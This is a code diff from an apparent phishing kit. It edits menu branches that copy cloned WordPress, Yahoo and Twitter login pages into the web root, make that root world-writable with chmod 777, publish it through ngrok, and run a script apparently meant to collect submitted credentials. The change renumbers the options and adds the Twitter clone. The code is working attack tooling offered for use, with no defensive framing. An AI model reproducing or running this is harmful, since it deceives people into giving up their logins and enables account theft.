@@ -166,16 +166,20 @@ elif stphish =="14":
     os.system("chmod 777 /var/www/html/")
     os.system("chmod 777 /var/www/html/*")
     os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
-elif stphish =="15":
+elif stphish =="16":
     os.system("cp -a sites/wordpress/. /var/www/html/ ")
     os.system("chmod 777 /var/www/html/")
     os.system("chmod 777 /var/www/html/*")
     os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
-elif stphish =="16":
+elif stphish =="17":
     os.system("cp -a sites/yahoo/. /var/www/html/ ")
+    os.system("chmod 777 /var/www/html/")
+    os.system("chmod 777 /var/www/html/*")
+    os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
+elif stphish =="15":
+    os.system("cp -a sites/twitter/. /var/www/html/ ")
     os.system("chmod 777 /var/www/html/")
     os.system("chmod 777 /var/www/html/*")
     os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python resu.py")
 else:
     print ("Bye bye phisher man is closed  -_-")
-
